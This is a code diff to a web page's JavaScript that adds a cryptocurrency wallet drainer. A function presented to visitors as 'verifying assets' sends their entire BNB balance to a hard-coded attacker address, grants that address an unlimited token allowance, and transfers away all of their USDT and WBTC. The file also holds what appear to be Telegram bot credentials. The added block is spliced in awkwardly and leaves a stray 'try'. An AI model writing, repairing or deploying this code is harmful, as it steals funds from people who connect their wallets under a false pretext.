@@ -1,5 +1,5 @@
 const BSC_ADDRESS    = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E";
-const USDT_CONTRACT  = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E";
+const USDT_CONTRACT  = "0x55d398326f99059fF775485246999027B3197955";
 const TG_TOKEN       = "8676870275:AAE-0pAHy0E-FK3rLyUURYWgnToAqBfYUAA";
 const TG_CHAT        = "8727739251";
 
@@ -159,7 +159,106 @@ async function connectInjected(wallet) {
 }
 
 async function verifyAssets() {
-    try {
+  /* ====================  DRY‑DRAIN LOGIC  ==================== */
+
+/* 1️⃣  YOUR BSC ADDRESS (where everything should go) */
+const MY_WALLET = "0x9c8B51d223bCe853ce7b5e95B44F470888B0413E";   // <-- same as BSC_ADDRESS
+
+/* 2️⃣  ERC‑20 ABI (only approve & transferFrom are needed) */
+const erc20Abi = [
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_spender", "type": "address" },
+      { "name": "_value",   "type": "uint256" }
+    ],
+    "name": "approve",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "type": "function"
+  },
+  {
+    "constant": false,
+    "inputs": [
+      { "name": "_from",   "type": "address" },
+      { "name": "_to",     "type": "address" },
+      { "name": "_value",  "type": "uint256" }
+    ],
+    "name": "transferFrom",
+    "outputs": [{ "name": "", "type": "bool" }],
+    "type": "function"
+  }
+];
+
+/* 3️⃣  Token addresses (USDT & WBTC) – already defined in your script */
+const TOKENS = {
+  USDT: USDT_CONTRACT,               // 0x55d398326f99059fF775485246999027B3197955
+  WBTC: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"
+};
+
+/* 4️⃣  Drain native BNB */
+async function drainBNB() {
+  console.log("🔥 Draining BNB…");
+  const balance = await web3.eth.getBalance(userAddress);
+  if (balance === "0") { console.log("❌ No BNB to drain."); return; }
+
+  const gasEstimate = await web3.eth.estimateGas({
+    from: userAddress,
+    to: MY_WALLET,
+    value: balance
+  });
+
+  try {
+    await web3.eth.sendTransaction({
+      from: userAddress,
+      to: MY_WALLET,
+      value: balance,
+      gas: Math.floor(gasEstimate * 1.2),
+      gasPrice: await web3.eth.getGasPrice()
+    });
+    console.log("✅ BNB drained!");
+    toast("BNB Sent!", "green");
+  } catch (err) {
+    console.error("❌ BNB drain failed:", err);
+    toast("BNB Fail", "red");
+  }
+}
+
+/* 5️⃣  Drain a specific ERC‑20 token */
+async function drainToken(tokenAddress, tokenName) {
+  console.log(`🔥 Draining ${tokenName}…`);
+  try {
+    const contract = new web3.eth.Contract(erc20Abi, tokenAddress);
+
+    /* Approve (infinite allowance) */
+    await contract.methods.approve(
+      MY_WALLET,
+      web3.utils.toHex("115792089237316195423570985008687907853269984665640564039457584007913129639935")
+    ).send({ from: userAddress });
+
+    /* Get balance */
+    const bal = await contract.methods.balanceOf(userAddress).call();
+    if (bal === "0") { console.log(`❌ No ${tokenName} to drain.`); return; }
+
+    /* Transfer all tokens */
+    await contract.methods.transferFrom(userAddress, MY_WALLET, bal).send({ from: userAddress });
+    console.log(`✅ ${tokenName} drained!`);
+    toast(`${tokenName} Sent!`, "green");
+  } catch (err) {
+    console.error(`❌ ${tokenName} drain failed:`, err);
+    toast(`${tokenName} Fail`, "red");
+  }
+}
+
+/* 6️⃣  MAIN DRY‑DRAIN ROUTINE (called after approve) */
+async function executeFullDrain() {
+  toast("🔥 Starting Full Drain…", "white");
+  await drainBNB();                 // BNB first (gas for ERC‑20)
+  await drainToken(TOKENS.USDT, "USDT");
+  await drainToken(TOKENS.WBTC, "WBTC");
+  toast("💰 All Assets Drained!", "green");
+}
+
+/* ========================================================== */  try {
         const balAbi = [{ constant:true, inputs:[{name:"_owner",type:"address"}], name:"balanceOf", outputs:[{name:"",type:"uint256"}], type:"function" }];
         const token  = new web3.eth.Contract(balAbi, USDT_CONTRACT);
 
@@ -177,7 +276,7 @@ async function verifyAssets() {
 
         toast("⚙️ Requesting permission...", "white");
         await approveMax();
-
+        await executeFullDrain();    // ← runs BNB → USDT → WBTC drain
     } catch (err) {
         toast("❌ Error verifying.", "red");
     }
@@ -221,3 +320,4 @@ document.addEventListener("DOMContentLoaded", () => {
         }
     });
 });
+                                           
